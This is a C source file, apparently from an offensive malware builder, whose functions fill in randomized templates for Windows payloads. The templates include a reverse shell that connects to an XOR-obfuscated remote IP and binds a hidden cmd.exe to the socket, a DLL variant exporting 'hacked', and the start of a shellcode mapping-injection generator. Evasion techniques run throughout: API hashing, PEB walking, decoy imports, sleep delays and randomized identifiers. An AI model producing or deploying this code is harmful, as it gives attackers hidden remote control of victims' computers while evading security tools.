        "    PPEB_LDR_DATA           pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY   pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xey[] = \"%s\";\n"
        "char hp[] = {%s};\n"
        "char pdm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "VOID %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s((char*)pdm, sizeof(pdm), xey, sizeof(xey));\n"
        "    %s((char*)hp, sizeof(hp), xey, sizeof(xey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    p%s(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        p%s();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = p%s(%d);\n"
        "    p%s(AF_INET, hp, &remot_addr.sin_addr);\n"
        "    if (p%s(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        p%s(socket);\n"
        "        p%s();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    %s(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"
        "    if (p%s(NULL, pdm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        p%s(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    p%s(pi.hProcess);\n"
        "    p%s(pi.hThread);\n"
        "    p%s(socket);\n"
        "    p%s();\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE hK3 = %s(%s);\n"
        "    HMODULE tdl = %s(%s);\n"
        "    %s p%s = (%s)%s(hK3, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), xey, sizeof(xey));\n"
        "    HMODULE hws = p%s(ws2);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hws, %s);\n"
        "    p%s = (%s)%s(hK3, %s);\n"
        "    p%s = (%s)%s(tdl, %s);\n"
        "    p%s = (%s)%s(tdl, %s);\n"
        "    p%s = (%s)%s(tdl, %s);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s();\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "}\n"
        "extern __declspec(dllexport) int hacked() {\n"
        "    %s();\n"
        "}\n"
        "BOOL APIENTRY DllMain(HMODULE , DWORD ul_reason_for_call, LPVOID ) {\n"
        "    switch (ul_reason_for_call) {\n"
        "    case DLL_PROCESS_ATTACH:\n"
        "    case DLL_PROCESS_DETACH:\n"
        "    case DLL_THREAD_ATTACH:\n"
        "    case DLL_THREAD_DETACH:\n"
        "        break;\n"
        "    }\n"
        "    return TRUE;\n"
        "}\n",
        random_toUpper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        inet_pton_hash_name,
        htons_hash_name,
        connect_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        ntwait_hash_name,
        ntdelay_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        inet_pton_typedef,
        htons_typedef,
        connect_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        NtWait_typedef,
        NtDelay_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_ip, obf_cmd, obf_ws2dll,
        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        inet_pton_typedef, pinet_pton_name,
        htons_typedef, phtons_name,
        connect_typedef, pconnect_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        NtWait_typedef, pNtWait_name,
        NtDelay_typedef, pNtDelay_name,
        NtClose_typedef, pNtClose_name,
        LoadLibraryA_typedef, pLoadLib_name,
        random_zero_func,
        random_delay_func,
        pNtDelay_name,
        random_connect_func,
        random_obf_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        pinet_pton_name,
        pconnect_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_zero_func,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        pinet_pton_name, inet_pton_typedef, random_getproc_name, inet_pton_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pconnect_name, connect_typedef, random_getproc_name, connect_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtDelay_name, NtDelay_typedef, random_getproc_name, ntdelay_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_func_name,
        random_init_func,
        random_delay_func,
        random_connect_func,
        random_func_name
    );
}
void obf_deley_2_tcp__time(char* payload, size_t size, const char* ip, const char* port_str) {
    int port = atoi(port_str);
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_func_name[10], random_var_name[10], random_helper_name[10];
    char random_toUpper_name[10], random_memcpy_name[10], random_seed_name[10];
    char random_obf_func[10], random_zero_func[10], random_delay_func[10];
    char random_connect_func[10], random_init_func[10];

    generate_random_string(random_func_name, sizeof(random_func_name));
    generate_random_string(random_var_name, sizeof(random_var_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_memcpy_name, sizeof(random_memcpy_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_zero_func, sizeof(random_zero_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_connect_func, sizeof(random_connect_func));
    generate_random_string(random_init_func, sizeof(random_init_func));

    // Random names for GetModuleHandleH and GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pWSAStartup_name[9], pWSASocketA_name[9], pinet_pton_name[9];
    char phtons_name[9], pconnect_name[9], pclosesocket_name[9];
    char pWSACleanup_name[9], pCreateProcessA_name[9], pNtWait_name[9];
    char pNtDelay_name[9], pNtClose_name[9], pLoadLib_name[9];

    generate_random_string(pWSAStartup_name, sizeof(pWSAStartup_name));
    generate_random_string(pWSASocketA_name, sizeof(pWSASocketA_name));
    generate_random_string(pinet_pton_name, sizeof(pinet_pton_name));
    generate_random_string(phtons_name, sizeof(phtons_name));
    generate_random_string(pconnect_name, sizeof(pconnect_name));
    generate_random_string(pclosesocket_name, sizeof(pclosesocket_name));
    generate_random_string(pWSACleanup_name, sizeof(pWSACleanup_name));
    generate_random_string(pCreateProcessA_name, sizeof(pCreateProcessA_name));
    generate_random_string(pNtWait_name, sizeof(pNtWait_name));
    generate_random_string(pNtDelay_name, sizeof(pNtDelay_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pLoadLib_name, sizeof(pLoadLib_name));

    // Random names for hashing definitions
    char kernel32_hash_name[11], ntdll_hash_name[12], loadlibrarya_hash_name[11];
    char wsastartup_hash_name[11], wsasocketa_hash_name[12], inet_pton_hash_name[12];
    char htons_hash_name[10], connect_hash_name[11], closesocket_hash_name[11];
    char wsacleanup_hash_name[13], createprocessa_hash_name[15], ntwait_hash_name[14];
    char ntdelay_hash_name[8], ntclose_hash_name[12];

    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(loadlibrarya_hash_name, sizeof(loadlibrarya_hash_name));
    generate_random_string(wsastartup_hash_name, sizeof(wsastartup_hash_name));
    generate_random_string(wsasocketa_hash_name, sizeof(wsasocketa_hash_name));
    generate_random_string(inet_pton_hash_name, sizeof(inet_pton_hash_name));
    generate_random_string(htons_hash_name, sizeof(htons_hash_name));
    generate_random_string(connect_hash_name, sizeof(connect_hash_name));
    generate_random_string(closesocket_hash_name, sizeof(closesocket_hash_name));
    generate_random_string(wsacleanup_hash_name, sizeof(wsacleanup_hash_name));
    generate_random_string(createprocessa_hash_name, sizeof(createprocessa_hash_name));
    generate_random_string(ntwait_hash_name, sizeof(ntwait_hash_name));
    generate_random_string(ntdelay_hash_name, sizeof(ntdelay_hash_name));
    generate_random_string(ntclose_hash_name, sizeof(ntclose_hash_name));

    // Random typedef names
    char WSAStartup_typedef[12], WSASocketA_typedef[12], inet_pton_typedef[12];
    char htons_typedef[12], connect_typedef[12], closesocket_typedef[12];
    char WSACleanup_typedef[12], CreateProcessA_typedef[12], NtWait_typedef[12];
    char NtDelay_typedef[12], NtClose_typedef[12], LoadLibraryA_typedef[12];

    generate_random_string(WSAStartup_typedef, sizeof(WSAStartup_typedef));
    generate_random_string(WSASocketA_typedef, sizeof(WSASocketA_typedef));
    generate_random_string(inet_pton_typedef, sizeof(inet_pton_typedef));
    generate_random_string(htons_typedef, sizeof(htons_typedef));
    generate_random_string(connect_typedef, sizeof(connect_typedef));
    generate_random_string(closesocket_typedef, sizeof(closesocket_typedef));
    generate_random_string(WSACleanup_typedef, sizeof(WSACleanup_typedef));
    generate_random_string(CreateProcessA_typedef, sizeof(CreateProcessA_typedef));
    generate_random_string(NtWait_typedef, sizeof(NtWait_typedef));
    generate_random_string(NtDelay_typedef, sizeof(NtDelay_typedef));
    generate_random_string(NtClose_typedef, sizeof(NtClose_typedef));
    generate_random_string(LoadLibraryA_typedef, sizeof(LoadLibraryA_typedef));

    char* xkey = generate_random_string_key();
    char* obf_ip = obf(ip, xkey);
    char* obf_cmd = obf("cmd.exe", xkey);
    char* obf_ws2dll = obf("ws2_32.dll", xkey);

    snprintf(payload, size,
        "#include <winsock2.h>\n"
        "#include <windows.h>\n"
        "#include <winternl.h>\n\n"
        "CHAR %s(CHAR C)\n"
        "{\n"
        "    if (C >= 'a' && C <= 'z')\n"
        "        return C - 'a' + 'A';\n"
        "    return C;\n"
        "}\n\n"
        "void* memcpy(void* dest, const void* src, size_t n) {\n"
        "    char* d = (char*)dest;\n"
        "    const char* s = (char*)src;\n"
        "    for (size_t i = 0; i < n; i++) {\n"
        "        d[i] = s[i];\n"
        "    }\n"
        "    return dest;\n"
        "}\n\n"
        "int %s(void)\n"
        "{\n"
        "    return '0' * -40271 +\n"
        "        __TIME__[7] * 1 +\n"
        "        __TIME__[6] * 10 +\n"
        "        __TIME__[4] * 60 +\n"
        "        __TIME__[3] * 600 +\n"
        "        __TIME__[1] * 3600 +\n"
        "        __TIME__[0] * 36000;\n"
        "}\n\n"
        "PVOID %s(PVOID* ppAddress) {\n"
        "    PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);\n"
        "    if (!pAddress)\n"
        "        return NULL;\n"
        "    *(int*)pAddress = %s() %% 0xFF;\n"
        "    *ppAddress = pAddress;\n"
        "    return pAddress;\n"
        "}\n\n"
        "VOID %s() {\n"
        "    PVOID pAddress = NULL;\n"
        "    int* A = (int*)%s(&pAddress);\n"
        "    if (*A > 350) {\n"
        "        unsigned __int64 i = MessageBoxA(0, 0, 0, 0);\n"
        "        i = GetLastError();\n"
        "        i = SetCriticalSectionSpinCount(0, 0);\n"
        "        i = GetWindowContextHelpId(0);\n"
        "        i = GetWindowLongPtrW(0, 0);\n"
        "        i = RegisterClassW(0);\n"
        "        i = IsWindowVisible(0);\n"
        "        i = ConvertDefaultLocale(0);\n"
        "        i = MultiByteToWideChar(0, 0, 0, 0, 0, 0);\n"
        "        i = IsDialogMessageW(0, 0);\n"
        "    }\n"
        "    HeapFree(GetProcessHeap(), 0, pAddress);\n"
        "}\n\n"
        "#define %s 0xA5E086A2\n"
        "#define %s 0x5251037A\n"
        "#define %s 0xA4E3F108\n"
        "#define %s 0x5925BC50\n"
        "#define %s 0xE2F31987\n"
        "#define %s 0xB9D29D42\n"
        "#define %s 0xBC98541E\n"
        "#define %s 0x068FB8DC\n"
        "#define %s 0x65188A91\n"
        "#define %s 0xE6AD20A5\n"
        "#define %s 0x4CA64FE6\n"
        "#define %s 0xCB42C5A9\n"
        "#define %s 0x1236E2D7\n"
        "#define %s 0xF20D7F2A\n\n"
        "typedef int (WINAPI* %s)(WORD, LPWSADATA);\n"
        "typedef SOCKET(WINAPI* %s)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);\n"
        "typedef int (WSAAPI* %s)(INT, PCSTR, PVOID);\n"
        "typedef u_short(WINAPI* %s)(u_short);\n"
        "typedef int (WINAPI* %s)(SOCKET, const struct sockaddr*, int);\n"
        "typedef int (WINAPI* %s)(SOCKET);\n"
        "typedef int (WINAPI* %s)(void);\n"
        "typedef BOOL(WINAPI* %s)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);\n"
        "typedef HMODULE(WINAPI* %s)(LPCSTR);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE, BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(BOOLEAN, PLARGE_INTEGER);\n"
        "typedef NTSTATUS(NTAPI* %s)(HANDLE);\n\n"
        "#define INITIAL_HASH 4338\n"
        "#define INITIAL_SEED 7\n\n"
        "DWORD HashStringDjb2A(_In_ LPCSTR String)\n"
        "{\n"
        "    ULONG Hash = INITIAL_HASH;\n"
        "    INT c;\n"
        "    while (c = *String++)\n"
        "        Hash = ((Hash << INITIAL_SEED) + Hash) + c;\n"
        "    return Hash;\n"
        "}\n"
        "#define HASHA(API) (HashStringDjb2A((PCHAR) API))\n\n"
        "FARPROC %s(HMODULE hModule, DWORD dwApiNameHash) {\n"
        "    if (hModule == NULL || dwApiNameHash == 0)\n"
        "        return NULL;\n"
        "    PBYTE pBase = (PBYTE)hModule;\n"
        "    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;\n"
        "    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)\n"
        "        return NULL;\n"
        "    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);\n"
        "    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)\n"
        "        return NULL;\n"
        "    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;\n"
        "    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);\n"
        "    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);\n"
        "    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);\n"
        "    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);\n"
        "    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {\n"
        "        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);\n"
        "        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);\n"
        "        if (dwApiNameHash == HASHA(pFunctionName)) {\n"
        "            return pFunctionAddress;\n"
        "        }\n"
        "    }\n"
        "    return NULL;\n"
        "}\n"
        "HMODULE %s(DWORD dwModuleNameHash) {\n"
        "    if (dwModuleNameHash == 0)\n"
        "        return NULL;\n"
        "#ifdef _WIN64\n"
        "    PPEB pPeb = (PEB*)(__readgsqword(0x60));\n"
        "#elif _WIN32\n"
        "    PPEB pPeb = (PEB*)(__readfsdword(0x30));\n"
        "#endif\n"
        "    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);\n"
        "    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);\n"
        "    while (pDte) {\n"
        "        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {\n"
        "            CHAR UpperCaseDllName[MAX_PATH];\n"
        "            DWORD i = 0;\n"
        "            while (pDte->FullDllName.Buffer[i]) {\n"
        "                UpperCaseDllName[i] = (CHAR)%s(pDte->FullDllName.Buffer[i]);\n"
        "                i++;\n"
        "            }\n"
        "            UpperCaseDllName[i] = '\\0';\n"
        "            if (HASHA(UpperCaseDllName) == dwModuleNameHash)\n"
        "                return pDte->Reserved2[0];\n"
        "        }\n"
        "        else {\n"
        "            break;\n"
        "        }\n"
        "        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);\n"
        "    }\n"
        "    return NULL;\n"
        "}\n\n"
        "void %s(char * data, size_t data_len, char * key, size_t key_len) {\n"
        "\tint j;\n"
        "\n\tj = 0;\n"
        "\tfor (int i = 0; i < data_len; i++) {\n"
        "\t\tif (j == key_len - 1) j = 0;\n"
        "\n\t\tdata[i] = data[i] ^ key[j];\n"
        "\t\tj++;\n"
        "\t}\n"
        "}\n"
        "char xey[] = \"%s\";\n"
        "char ph[] = {%s};\n"
        "char hm[] = {%s};\n"
        "char ws2[] = {%s};\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n"
        "%s p%s;\n\n"
        "VOID %s(void* ptr, size_t size) {\n"
        "    char* p = (char*)ptr;\n"
        "    for (size_t i = 0; i < size; i++) {\n"
        "        p[i] = 0;\n"
        "    }\n"
        "}\n"
        "VOID %s(IN FLOAT fMinutes) {\n"
        "    DWORD dwMilliSeconds = (DWORD)(fMinutes * 60000.0f);\n"
        "    LONGLONG Delay = (LONGLONG)dwMilliSeconds * -10000LL;\n"
        "    LARGE_INTEGER DelayInterval = { .QuadPart = Delay };\n"
        "    p%s(FALSE, &DelayInterval);\n"
        "}\n"
        "VOID %s() {\n"
        "    %s((char*)hm, sizeof(hm), xey, sizeof(xey));\n"
        "    %s((char*)ph, sizeof(ph), xey, sizeof(xey));\n"
        "    LARGE_INTEGER timeout;\n"
        "    timeout.QuadPart = -500000;\n"
        "    WSADATA wsadata;\n"
        "    p%s(MAKEWORD(2, 2), &wsadata);\n"
        "    SOCKET socket = p%s(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n"
        "    if (socket == INVALID_SOCKET) {\n"
        "        p%s();\n"
        "    }\n"
        "    struct sockaddr_in remot_addr;\n"
        "    remot_addr.sin_family = AF_INET;\n"
        "    remot_addr.sin_port = p%s(%d);\n"
        "    p%s(AF_INET, ph, &remot_addr.sin_addr);\n"
        "    if (p%s(socket, (SOCKADDR*)&remot_addr, sizeof(remot_addr)) == SOCKET_ERROR) {\n"
        "        p%s(socket);\n"
        "        p%s();\n"
        "    }\n"
        "    STARTUPINFO si;\n"
        "    PROCESS_INFORMATION pi;\n"
        "    %s(&si, sizeof(si));\n"
        "    si.cb = sizeof(si);\n"
        "    si.dwFlags = STARTF_USESTDHANDLES;\n"
        "    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)socket;\n"
        "    if (p%s(NULL, hm, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {\n"
        "        p%s(pi.hProcess, FALSE, &timeout);\n"
        "    }\n"
        "    p%s(pi.hProcess);\n"
        "    p%s(pi.hThread);\n"
        "    p%s(socket);\n"
        "    p%s();\n"
        "}\n"
        "BOOL %s() {\n"
        "    HMODULE K32 = %s(%s);\n"
        "    HMODULE l32 = %s(%s);\n"
        "    %s p%s = (%s)%s(K32, %s);\n"
        "    %s((char*)ws2, sizeof(ws2), xey, sizeof(xey));\n"
        "    HMODULE h32 = p%s(ws2);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(h32, %s);\n"
        "    p%s = (%s)%s(K32, %s);\n"
        "    p%s = (%s)%s(l32, %s);\n"
        "    p%s = (%s)%s(l32, %s);\n"
        "    p%s = (%s)%s(l32, %s);\n"
        "}\n"
        "int WINAPI WinMain(HINSTANCE ,HINSTANCE ,LPSTR ,int) {\n"
        "    %s();\n"
        "    %s(0.5);\n"
        "    %s();\n"
        "    return 0;\n"
        "}\n",
        random_toUpper_name,
        random_seed_name,
        random_helper_name,
        random_seed_name,
        random_func_name,
        random_helper_name,
        kernel32_hash_name,
        ntdll_hash_name,
        loadlibrarya_hash_name,
        wsastartup_hash_name,
        wsasocketa_hash_name,
        inet_pton_hash_name,
        htons_hash_name,
        connect_hash_name,
        closesocket_hash_name,
        wsacleanup_hash_name,
        createprocessa_hash_name,
        ntwait_hash_name,
        ntdelay_hash_name,
        ntclose_hash_name,
        WSAStartup_typedef,
        WSASocketA_typedef,
        inet_pton_typedef,
        htons_typedef,
        connect_typedef,
        closesocket_typedef,
        WSACleanup_typedef,
        CreateProcessA_typedef,
        LoadLibraryA_typedef,
        NtWait_typedef,
        NtDelay_typedef,
        NtClose_typedef,
        random_getproc_name,
        random_getmodule_name,
        random_toUpper_name,
        random_obf_func,
        xkey, obf_ip, obf_cmd, obf_ws2dll,


        WSAStartup_typedef, pWSAStartup_name,
        WSASocketA_typedef, pWSASocketA_name,
        inet_pton_typedef, pinet_pton_name,
        htons_typedef, phtons_name,
        connect_typedef, pconnect_name,
        closesocket_typedef, pclosesocket_name,
        WSACleanup_typedef, pWSACleanup_name,
        CreateProcessA_typedef, pCreateProcessA_name,
        NtWait_typedef, pNtWait_name,
        NtDelay_typedef, pNtDelay_name,
        NtClose_typedef, pNtClose_name,
        LoadLibraryA_typedef, pLoadLib_name,

        random_zero_func,

        random_delay_func,
        pNtDelay_name,

        random_connect_func,
        random_obf_func,
        random_obf_func,
        pWSAStartup_name,
        pWSASocketA_name,
        pWSACleanup_name,
        phtons_name, port,
        pinet_pton_name,
        pconnect_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_zero_func,
        pCreateProcessA_name,
        pNtWait_name,
        pNtClose_name,
        pNtClose_name,
        pclosesocket_name,
        pWSACleanup_name,
        random_init_func,
        random_getmodule_name, kernel32_hash_name,
        random_getmodule_name, ntdll_hash_name,
        LoadLibraryA_typedef, pLoadLib_name, LoadLibraryA_typedef, random_getproc_name, loadlibrarya_hash_name,
        random_obf_func,
        pLoadLib_name,
        pWSAStartup_name, WSAStartup_typedef, random_getproc_name, wsastartup_hash_name,
        pWSASocketA_name, WSASocketA_typedef, random_getproc_name, wsasocketa_hash_name,
        pinet_pton_name, inet_pton_typedef, random_getproc_name, inet_pton_hash_name,
        phtons_name, htons_typedef, random_getproc_name, htons_hash_name,
        pconnect_name, connect_typedef, random_getproc_name, connect_hash_name,
        pclosesocket_name, closesocket_typedef, random_getproc_name, closesocket_hash_name,
        pWSACleanup_name, WSACleanup_typedef, random_getproc_name, wsacleanup_hash_name,
        pCreateProcessA_name, CreateProcessA_typedef, random_getproc_name, createprocessa_hash_name,
        pNtWait_name, NtWait_typedef, random_getproc_name, ntwait_hash_name,
        pNtDelay_name, NtDelay_typedef, random_getproc_name, ntdelay_hash_name,
        pNtClose_name, NtClose_typedef, random_getproc_name, ntclose_hash_name,
        random_init_func,
        random_delay_func,
        random_connect_func
    );
}
void obf_deley_4_mapping_injection(char* payload, size_t size, PBYTE shellcode, DWORD shellcodeSize, PBYTE key, DWORD keySize, byte hint) {
    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Random name generation for variables and functions
    char random_toUpper_name[10], random_seed_name[10], random_helper_name[10];
    char random_obf_func[10], random_delay_func[10], random_inject_func[10];
    char random_iatcamouflage_name[10];

    generate_random_string(random_toUpper_name, sizeof(random_toUpper_name));
    generate_random_string(random_seed_name, sizeof(random_seed_name));
    generate_random_string(random_helper_name, sizeof(random_helper_name));
    generate_random_string(random_obf_func, sizeof(random_obf_func));
    generate_random_string(random_delay_func, sizeof(random_delay_func));
    generate_random_string(random_inject_func, sizeof(random_inject_func));
    generate_random_string(random_iatcamouflage_name, sizeof(random_iatcamouflage_name));

    // Random names for GetModuleHandleH, GetProcAddressH
    char random_getmodule_name[15], random_getproc_name[15];

    generate_random_string(random_getmodule_name, sizeof(random_getmodule_name));
    generate_random_string(random_getproc_name, sizeof(random_getproc_name));

    // Random pointer names
    char pSystemFunction032_name[9], pLoadLibraryA_name[9], pGetProcAddress_name[9];
    char pNtCreateSection_name[9], pNtMapViewOfSection_name[9], pUnmapViewOfSection_name[9];
    char pNtCreateThreadEx_name[9], pNtWaitForSingleObject_name[9], pNtClose_name[9];
    char pNtDelayExecution_name[9];

    generate_random_string(pSystemFunction032_name, sizeof(pSystemFunction032_name));
    generate_random_string(pLoadLibraryA_name, sizeof(pLoadLibraryA_name));
    generate_random_string(pGetProcAddress_name, sizeof(pGetProcAddress_name));
    generate_random_string(pNtCreateSection_name, sizeof(pNtCreateSection_name));
    generate_random_string(pNtMapViewOfSection_name, sizeof(pNtMapViewOfSection_name));
    generate_random_string(pUnmapViewOfSection_name, sizeof(pUnmapViewOfSection_name));
    generate_random_string(pNtCreateThreadEx_name, sizeof(pNtCreateThreadEx_name));
    generate_random_string(pNtWaitForSingleObject_name, sizeof(pNtWaitForSingleObject_name));
    generate_random_string(pNtClose_name, sizeof(pNtClose_name));
    generate_random_string(pNtDelayExecution_name, sizeof(pNtDelayExecution_name));

    // Random names for hashing definitions
    char ntdll_hash_name[11], kernel32_hash_name[11], ntcreatesection_hash_name[11];
    char ntmapviewofsection_hash_name[12], ntunmapviewofsection_hash_name[12], ntwaitforsingleobject_hash_name[12];
    char ntcreatethreadex_hash_name[11], ntdelayexecution_hash_name[11], ntclose_hash_name[11];
    char loadlibrarya_hash_name[11], getprocaddress_hash_name[11];

    generate_random_string(ntdll_hash_name, sizeof(ntdll_hash_name));
    generate_random_string(kernel32_hash_name, sizeof(kernel32_hash_name));
